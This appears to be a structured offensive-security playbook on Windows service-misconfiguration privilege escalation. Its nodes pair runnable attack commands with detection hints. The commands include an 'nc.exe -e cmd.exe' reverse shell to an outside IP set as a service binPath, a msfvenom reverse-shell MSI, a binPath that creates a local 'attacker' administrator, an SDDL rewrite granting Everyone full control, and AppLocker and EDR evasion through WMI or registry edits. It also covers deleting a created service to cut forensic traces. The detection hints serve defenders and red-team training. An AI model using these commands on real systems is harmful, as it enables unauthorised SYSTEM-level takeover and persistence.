phase.title: Service Misconfigurations
phase.summary: Abuse misconfigured Windows services: weak ACLs, unquoted paths, hijackable binaries, AlwaysInstallElevated.

nodes.title: Service Enumeration
nodes.summary: Discover services, their binaries, start modes, and ACLs.
nodes.description_md: Begin every service-misconfig path with a wide sweep filtering out built-in Microsoft services to surface third-party (often weakest) services first.

snippets.title: Non-Microsoft services
snippets.code:
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -notlike 'C:\Windows\*' } |
  Select-Object Name, DisplayName, StartMode, State, PathName, StartName |
  Format-Table -AutoSize

snippets.title: sc.exe queryex
snippets.code: sc queryex type= service state= all > services.txt

nodes.detection_hints: Mass `sc qc` from a non-admin context is a strong pre-exploit signal in Sysmon 1.

nodes.title: Unquoted Service Path
nodes.summary: Services whose BINARY_PATH contains spaces but no quotes can be hijacked by planting a binary in an earlier path segment.

snippets.title: Find unquoted auto-start services
snippets.code: wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""

snippets.title: PowerShell equivalent
snippets.code:
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.StartMode -eq 'Auto' } |
  Select Name, PathName, StartName

snippets.title: Plant + restart
snippets.code:
copy payload.exe "C:\Program Files\Vulnerable\Service.exe"
sc stop VulnSvc
sc start VulnSvc

nodes.detection_hints: New executables matching `C:\Program*.exe` patterns; service-account-spawned children of `services.exe` with unexpected image paths.
nodes.description_md:
Windows resolves service binary paths containing spaces by trying progressively longer interpretations. For a path like `C:\Program Files\Vendor App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\Vendor.exe`
3. `C:\Program Files\Vendor App\service.exe`

If any of those intermediate paths are writable and the path isn't quoted, planting a file at an earlier resolution point hijacks execution.

**Exploitation steps**:
1. Find a service with an unquoted path that has spaces
2. Check write permissions on each intermediate directory
3. Drop a payload named to match the hijack point
4. Stop and restart the service (or wait for system reboot if it's auto-start)

**Detection tool**: `wmic service get name,pathname` filtered for paths with spaces but no quotes, cross-referenced with write-ACL checks on intermediate directories.

nodes.title: Weak Service ACL (SERVICE_CHANGE_CONFIG)
nodes.summary: If your user has SERVICE_CHANGE_CONFIG on a service, rewrite its binPath and restart it for code execution as its account.

snippets.title: accesschk — writable services
snippets.code:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "%USERNAME%" *

snippets.title: Hijack binPath
snippets.code:
sc config VulnSvc binPath= "C:\Temp\nc.exe -e cmd.exe 10.10.14.5 4444"
sc config VulnSvc obj= LocalSystem type= own
sc stop VulnSvc
sc start VulnSvc

nodes.description_md:
The Windows Service Control Manager enforces a DACL on each service object. When `SERVICE_CHANGE_CONFIG` (or the broader `SERVICE_ALL_ACCESS`) is granted to a low-privilege account, any user in that group can call `sc config` to rewrite the `binPath` — the binary the service executes when started.

**Full exploitation chain**:
1. `accesschk.exe /accepteula -uwcqv "%USERNAME%" *` — find services where you have write perms
2. `sc config <svc> binPath= "<payload>"` — redirect to your binary
3. `sc stop <svc>` then `sc start <svc>` — trigger execution
4. Payload runs in the service's security context (often SYSTEM)

**Notes**: If you can't stop/start the service directly, a system reboot (if auto-start) achieves the same result. Always save the original binPath for cleanup.
nodes.detection_hints: EID 7040 (service config changed) correlated with a non-admin account; `sc.exe config` commands in process creation logs; unexpected changes to `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`.

nodes.title: Writable Service Binary
nodes.summary: Service binary itself is writable — overwrite with a payload and restart the service.

snippets.title: Test writability
snippets.code: accesschk.exe /accepteula -quvw "C:\Program Files\Vulnerable\Service.exe"

snippets.title: Backup + overwrite + restart
snippets.code:
copy "C:\Program Files\Vulnerable\Service.exe" C:\Temp\Service.bak
copy payload.exe "C:\Program Files\Vulnerable\Service.exe" /Y
sc stop VulnSvc
sc start VulnSvc

nodes.description_md:
If a service's binary file itself has weak filesystem ACLs (e.g., `BUILTIN\Users:(W)` or `Everyone:(F)`), an attacker can overwrite it with a payload and restart the service. The service's security context (often SYSTEM) executes the replacement binary on next start.

**Key difference from svc-weak-acl**: The service configuration itself is legitimate — only the underlying file has weak permissions, which is a filesystem misconfiguration, not a service ACL misconfiguration.

**Steps**:
1. Locate non-standard services whose binaries are outside `C:\Windows\`
2. Check file ACLs: `accesschk.exe -quvw <binary>` or `icacls <binary>`
3. Back up the original binary
4. Overwrite with your payload
5. `net stop <svc>; net start <svc>` or wait for reboot

**Common pattern**: Third-party software installed under `C:\Program Files\VendorName\` with overly permissive install-time ACLs.
nodes.detection_hints: File write operations to service binary paths by non-SYSTEM/non-admin accounts; EID 7045 if service is registered fresh; unexpected hashes on monitored service binaries (FIM).

nodes.title: Service DLL Hijacking
nodes.summary: Service loads a DLL from a writable directory in its search order — drop a malicious DLL.

snippets.title: Procmon filter
snippets.code: Operation = CreateFile AND Path ENDS WITH .dll AND Result = NAME NOT FOUND

nodes.description_md:
Service binaries often load DLLs from their installation directory or from directories in the system PATH. If a DLL required by a service binary cannot be found in its expected location, Windows falls back to the full DLL search order. Planting a malicious DLL at a location searched before the legitimate one — or in a directory where the DLL is expected but doesn't exist (phantom DLL) — causes the service to load attacker code at SYSTEM.

**Discovery method** (on a test VM with Procmon):
1. Filter: `Process Name is <service binary>` AND `Path ends with .dll` AND `Result is NAME NOT FOUND`
2. Note which writable directories are probed
3. Drop a matching DLL there

**In-scope checks (without Procmon)**: Enumerate service binary directories for writability; check if any known phantom DLLs (e.g., WLBSCTRL.dll, ntwdblib.dll) apply to installed services.
nodes.detection_hints: DLL loads from user-writable directories by SYSTEM-context services; new .dll files created in service install directories by non-admin accounts; Sysmon EID 7 (ImageLoaded) for unexpected module paths.

nodes.title: AlwaysInstallElevated MSI
nodes.summary: When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, any MSI installs as SYSTEM.

snippets.title: Check both keys
snippets.code:
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

snippets.title: Build evil MSI (attacker)
snippets.code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

snippets.title: Install on victim
snippets.code: msiexec /quiet /qn /i C:\Temp\evil.msi

nodes.description_md:
The `AlwaysInstallElevated` group policy sets two registry values that cause the Windows Installer (`msiexec.exe`) to run with SYSTEM privileges regardless of who invokes it. An attacker who can execute an MSI file on a system where both keys are set to 1 effectively runs code as SYSTEM.

**Prerequisites**: Both `HKLM\...\Installer\AlwaysInstallElevated = 1` AND `HKCU\...\Installer\AlwaysInstallElevated = 1` must be set.

**MSI payload creation** (attacker host):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
```

**Execution** (victim):
```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

**Discovery**: PowerUp's `Get-RegistryAlwaysInstallElevated` or manual `reg query` on both hives.
nodes.detection_hints: MSI installation from a non-admin user; process ancestry `msiexec.exe → unexpected child` at SYSTEM; registry key changes to AlwaysInstallElevated (EID 4657).

nodes.title: Service Modification via WMI
nodes.summary: When `sc.exe` is blocked by AppLocker / WDAC, set service properties through WMI / CIM directly.

snippets.title: Set service PathName via CIM
snippets.code:
$svc = Get-CimInstance Win32_Service -Filter "Name='VulnSvc'"
Invoke-CimMethod -InputObject $svc -MethodName Change -Arguments @{ PathName='C:\Temp\payload.exe' }

nodes.description_md:
When `sc.exe` is blocked by AppLocker or monitored by EDR, the same service configuration changes can be performed through WMI's `Win32_Service` class using `Invoke-CimMethod` or `Set-WmiInstance`. This approach avoids spawning `sc.exe` and can fly under signature-based detection tuned for that binary.

**Use case**: You've found a service with weak ACLs but `sc.exe` is on AppLocker's blocklist, or its invocation triggers an EDR alert. PowerShell or CIM can achieve the identical outcome via WMI.

**Methods available via Win32_Service**:
- `Change()` — full equivalent to `sc config`; modifies PathName, StartName, etc.
- `StartService()` / `StopService()` — control the service lifecycle

**Note**: Requires the same level of permissions (SERVICE_CHANGE_CONFIG) as `sc.exe` — WMI is just an alternate delivery mechanism.
nodes.detection_hints: WMI `Win32_Service.Change()` invocations from non-admin contexts; PowerShell `Invoke-CimMethod` with service method calls; service config changes without corresponding sc.exe process creation.

nodes.title: Writable Service Registry Key
nodes.summary: Writable `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` lets you set ImagePath without sc.exe.

snippets.title: Check ACL on service key
snippets.code: accesschk.exe /accepteula -kvuqsw hklm\system\currentcontrolset\services

snippets.title: Modify ImagePath via reg
snippets.code: reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\payload.exe" /f

nodes.description_md:
Every Windows service stores its configuration under `HKLM\SYSTEM\CurrentControlSet\Services\<svcname>`. If the ACL on this registry key grants write access to a low-privilege account, the attacker can directly modify the `ImagePath` value — the same outcome as `sc config binPath` but done entirely through the registry.

**Why this matters**: In environments where `sc.exe` is monitored or AppLocker-blocked, direct registry modification may be less visible. It also enables changing the `Start` type (DWORD) to `2` (auto-start) to ensure execution on next boot.

**Key values to target**:
- `ImagePath` (REG_EXPAND_SZ) — the binary path
- `ObjectName` — the account the service runs as
- `Start` — 2 = auto, 3 = manual, 4 = disabled

**Discovery**: `accesschk.exe /accepteula -kvuqsw hklm\system\currentcontrolset\services`
nodes.detection_hints: Registry modification events (EID 4657/13) on service keys by non-SYSTEM accounts; unexpected `ImagePath` values in service registry keys.

nodes.title: SERVICE_CHANGE_CONFIG Abuse via sc config binPath
nodes.summary: Modify a service's binary path to point to an attacker-controlled executable using sc config when SERVICE_CHANGE_CONFIG is granted.
nodes.description_md:
When a user holds `SERVICE_CHANGE_CONFIG` on a service, the `sc config` command can rewrite the `binPath` (ImagePath) to any executable, including a reverse shell or `net user` command. On next service start (or restart), the payload executes in the service's security context—often SYSTEM.

Prerequisites: discovered via `accesschk` or `Get-Acl`; service must be stoppable/startable or a reboot must be feasible.
nodes.detection_hints: Correlate Event ID 7040 (service config changed) with non-administrative accounts. Monitor `sc.exe` execution with `config` subcommand from non-system processes. Audit `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` changes.

snippets.title: Overwrite binPath and trigger execution
snippets.code:
sc config VulnSvc binpath= "C:\Temp\payload.exe"
sc stop VulnSvc
sc start VulnSvc
snippets.description: Replace the service binary path with an attacker payload, then restart the service to execute as SYSTEM.

snippets.title: binPath inline net user command
snippets.code:
sc config VulnSvc binpath= "cmd.exe /c net user attacker P@ssw0rd1! /add && net localgroup Administrators attacker /add"
sc start VulnSvc
snippets.description: Execute net user commands via binPath to create a local admin account.

references.title: MITRE ATT&CK - Services Registry Permissions Weakness

nodes.title: Weak Service Permission Discovery via accesschk
nodes.summary: Use Sysinternals accesschk to enumerate services where non-privileged users hold dangerous ACEs such as SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, or WRITE_DAC.
nodes.description_md:
Accesschk.exe from Sysinternals rapidly identifies which services grant excessive permissions to low-privileged groups (e.g., `Everyone`, `BUILTIN\Users`, `NT AUTHORITY\Authenticated Users`). This is often the first step before chaining to `svc-sc-binpath` or `svc-registry-acl`.

Key flags:
- `-ucwv`: show write-capable services for current user
- `-kwv`: scan registry keys
- `-c "*"`: all services
nodes.detection_hints: Monitor execution of accesschk.exe, sc.exe with `sdshow`, and PowerShell `Get-Acl` against service objects. Unexpected enumeration of all services by non-admin accounts is suspicious.

snippets.title: Enumerate writable services for current user
snippets.code:
accesschk.exe -uwcv Everyone *
accesschk.exe -uwcv "Authenticated Users" *
accesschk.exe -uwcv %USERNAME% *
snippets.description: Find services where the current user or broad groups have write-level access.

snippets.title: PowerShell fallback enumeration
snippets.description: PowerShell-based service ACL enumeration when accesschk is unavailable.

nodes.title: SYSTEM Service with Writable Binary Path
nodes.summary: Replace the executable of a service running as SYSTEM when the binary file or its parent directory has weak filesystem ACLs allowing write by a low-privileged user.
nodes.description_md:
A service running as `LocalSystem` whose `ImagePath` points to a binary writable by non-admin users can be escalated by simply overwriting the binary. This differs from `svc-weak-binary-acl` in scope—here the focus is on the SYSTEM context and the writable directory (not just the file).

Common misconfig: third-party software installed under `C:\Program Files\VendorApp\` where `BUILTIN\Users` has `(W)` on the install directory.
nodes.detection_hints: Baseline service binary hashes. Alert on writes to service ImagePath locations by non-SYSTEM/admin accounts. File integrity monitoring on `C:\Program Files\` subdirectories.

snippets.title: Find SYSTEM services with writable binary
snippets.description: Identify services running as SYSTEM whose binary is writable by non-privileged identities.

snippets.title: Overwrite binary with payload
snippets.code:
copy /Y C:\Temp\payload.exe "C:\Program Files\VulnApp\service.exe"
net stop VulnSvc && net start VulnSvc
snippets.description: Replace the service executable with a payload and restart.

references.title: MITRE ATT&CK - Services File Permissions Weakness

nodes.title: Insecure Service Recovery Action Abuse
nodes.summary: Exploit a service configured to run a program on failure (recovery action) where that program path is attacker-controlled or the recovery action can be modified.
nodes.description_md:
Windows services can be configured with failure recovery actions: restart, run a program, or reboot. When `Run Program` is set and the command path is writable or the service's failure configuration can be changed (requires `SERVICE_CHANGE_CONFIG`), an attacker can trigger the service to fail and have their payload run as SYSTEM.

Verify current recovery actions with `sc qfailure <svcname>`. Modify with `sc failure`.
nodes.detection_hints: Monitor Event ID 7023/7031 (service terminated unexpectedly) followed shortly by execution of non-standard processes. Audit `FailureCommand` registry values under `HKLM\SYSTEM\CurrentControlSet\Services\`.

snippets.title: Query and set service failure recovery
snippets.code:
sc qfailure VulnSvc
sc failure VulnSvc reset= 0 actions= run/5000 command= "C:\Temp\payload.exe"
sc start VulnSvc
taskkill /F /IM VulnSvc.exe
snippets.description: Configure a service to run a payload on first failure, then cause the service to fail.

snippets.title: Query failure commands via registry
snippets.description: Enumerate all services with a FailureCommand set via registry.

nodes.title: SERVICE_ALL_ACCESS via sc sdshow / sdset
nodes.summary: Read and rewrite a service's Security Descriptor using sc sdshow and sc sdset to grant an unprivileged user full control over a privileged service.
nodes.description_md:
Windows services have a Security Descriptor (SDDL) that controls who can query, start, stop, or reconfigure them. If the current user holds `WRITE_DAC` on a service, `sc sdset` can be used to insert an ACE granting `SERVICE_ALL_ACCESS (GA)` to the current user.

Example SDDL injection: append `(A;;RPWPCRCCDCLCSWLOCRRC;;;WD)` to grant `Everyone` full access.

After modifying the SD, chain to `svc-sc-binpath` for execution.
nodes.detection_hints: Alert on sc.exe invocations with `sdset`. Monitor Event ID 4670 (permissions on object changed) for service objects. Audit unexpected SDDL modifications.

snippets.title: Read and rewrite service SDDL
snippets.code:
sc sdshow VulnSvc
rem Append (A;;RPWPCRCCDCLCSWLOCRRC;;;WD) to the existing SDDL
sc sdset VulnSvc "D:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPCRCCDCLCSWLOCRRC;;;WD)"
snippets.description: Grant Everyone SERVICE_ALL_ACCESS on the target service by rewriting its security descriptor.

snippets.title: Verify new permissions with accesschk
snippets.code: accesschk.exe -ucwv VulnSvc
snippets.description: Confirm the modified SDDL grants the expected permissions.

nodes.title: Dependent Service Abuse for Privilege Escalation
nodes.summary: Exploit a service that depends on a user-controllable service: by replacing the dependency's binary, the dependent privileged service executes attacker code on start.
nodes.description_md:
Windows services can declare dependencies via `DependOnService`. When a high-privilege service (e.g., SYSTEM) depends on a lower-privilege service whose binary or config the attacker controls, restarting the dependent chain causes the attacker's code to run in the context of the privileged service.

Enumeration: `sc qc <svcname>` reveals `DEPENDENCIES`. Also query via `Get-Service -DependentServices`.
nodes.detection_hints: Monitor for unusual service dependency modifications in the registry. Alert on stop/start of dependency chains involving SYSTEM services by non-admin accounts.

snippets.title: Enumerate service dependencies
snippets.code:
sc qc SystemSvc
rem Look for DEPENDENCIES line
sc enumdepend LowPrivSvc 4096
snippets.description: Find which high-privilege services depend on a service the attacker can modify.

snippets.title: Map dependent services
snippets.description: Map all service dependencies to identify high-value targets.

nodes.title: Create New Service with Elevated Execution
nodes.summary: Register a new service pointing to an attacker binary using sc create when the user has SC_MANAGER_CREATE_SERVICE rights on the Service Control Manager.
nodes.description_md:
The Service Control Manager (SCM) has its own SDDL. If a non-admin user is granted `SC_MANAGER_CREATE_SERVICE` (CC in SDDL), they can register a new service with an arbitrary binary path running as `LocalSystem`.

Verify SCM ACL: `sc sdshow scmanager`. This technique is also possible from an elevated shell to establish persistence.
nodes.detection_hints: Event ID 7045 (new service installed). Monitor `sc.exe create` invocations and `HKLM\SYSTEM\CurrentControlSet\Services` for unexpected new keys. Alert on service creation by non-admin SIDs.

snippets.title: Check SCM ACL and create new service
snippets.code:
sc sdshow scmanager
sc create EvilSvc binpath= "C:\Temp\payload.exe" start= auto obj= LocalSystem
sc start EvilSvc
snippets.description: Verify SC_MANAGER_CREATE_SERVICE rights, then register and start a SYSTEM-context service.

snippets.title: Cleanup: delete service after execution
snippets.code:
sc stop EvilSvc
sc delete EvilSvc
snippets.description: Remove the created service to reduce forensic artifacts.

references.title: MITRE ATT&CK - Create or Modify System Process: Windows Service

nodes.title: Service Enumeration and Abuse via WMIC and PsService
nodes.summary: Use WMIC and Sysinternals PsService for deeper service enumeration including service accounts, start modes, and configuration not visible via sc query.
nodes.description_md:
WMIC and PsService expose additional service attributes useful for privilege escalation enumeration:
- WMIC: StartName (service account), ProcessId, State, PathName
- PsService: full configuration, dependency trees, SCM-level ACLs

This complements `accesschk` discovery and helps identify services running as domain accounts or with auto-start set to interesting values.
nodes.detection_hints: Monitor wmic.exe and PsService.exe execution from non-admin sessions. WMIC service queries are often seen in enumeration scripts (PowerUp, winPEAS).

snippets.title: WMIC service enumeration
snippets.code:
wmic service get name,startname,pathname,startmode,state /format:list
wmic service where "startname != 'LocalSystem'" get name,startname,pathname
snippets.description: List all services with their account context and binary path; highlight non-SYSTEM accounts.

snippets.title: PsService full config dump
snippets.code:
PsService.exe config VulnSvc
PsService.exe security VulnSvc
snippets.description: Dump full service configuration and security descriptor using PsService.

nodes.title: Service Path Spaces Beyond Unquoted Path (Directory Hijack)
nodes.summary: Place a malicious executable at an intermediate path segment exploited by the Windows service path resolution algorithm when service paths contain spaces and no quotes.
nodes.description_md:
Extends the classic unquoted service path (svc-unquoted-path): focus on writable intermediate directories. Windows tries `C:\Program.exe`, `C:\Program Files\Vendor.exe`, then `C:\Program Files\Vendor App\Service.exe`. An attacker needs write access to any directory in this chain, not just the final directory.

Key difference from `svc-unquoted-path`: the evaluation here is on finding writable intermediate parent directories that the classic tool check may miss, especially under non-standard installation trees.
nodes.detection_hints: Alert on creation of .exe files at path roots or intermediate directories that do not match known software. Monitor Event ID 4688 for process creation from unexpected locations.

snippets.title: Find unquoted paths with writable intermediate dirs
snippets.description: Identify services with unquoted paths and enumerate write access to every intermediate directory.

snippets.title: Place payload at hijack point
snippets.code:
copy C:\Temp\payload.exe "C:\Program Files\Vendor.exe"
net stop VulnSvc && net start VulnSvc
snippets.description: Drop payload at the hijack location and restart the service.

references.title: MITRE ATT&CK - Path Interception by Unquoted Path
